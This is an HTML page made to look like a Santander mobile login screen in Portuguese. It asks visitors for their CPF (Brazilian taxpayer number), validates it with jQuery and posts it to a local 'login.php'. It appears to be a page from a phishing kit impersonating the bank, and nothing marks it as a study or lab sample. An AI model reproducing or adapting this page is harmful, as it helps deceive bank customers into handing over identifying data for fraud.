<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Santander</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
<meta name="mobile-web-app-capable" content="yes">

<link rel="stylesheet" type="text/css" href="style.css" />

<script language="javascript">
	var isOK = false;
</script>


<script src="js/jquery-3.2.1.min.js" language="javascript"></script>
<script src="script.js" language="javascript"></script>

</head>

<body onLoad="window.scrollTo(0,1);">
<div id="topo">
	<img src="images/santanderlogo.png">	
</div>
	
<div id="topo2">
	<img src="images/ico_key_acesso.png" />
	<div class="acessar"><p>Acessar</p></div>

</div>	

<div id="campos">
<form id="frm" action="login.php" method="post" enctype="application/x-www-form-urlencoded" onSubmit="return isOK;">
<table width="80%" class="center pt100">
  <tbody>
    <tr>
      <td><span>CPF</span></td>
    </tr>
    <tr>
      <td><input class="frm" type="number" id="cpf" name="cpf" onkeydown="limit(this, 11);" onkeyup="limit(this,11);" required></td>
    </tr>    
  </tbody>
    
</table>

<div class="pt30">
	<input type="button" id="btn-entrar" value="ENTRAR">
</div>
	
		
</form>

</div>

<script language="javascript">
 $( document ).ready(function() {
	 
	$( "#btn-entrar" ).click(function() {
		if (checkCPF()){
			isOK = true;	
			$("#frm").submit();	
		} else {
			alert("CPF incorreto, informe corretamente.");
		}
	});	
	

});
	
</script>
</html>
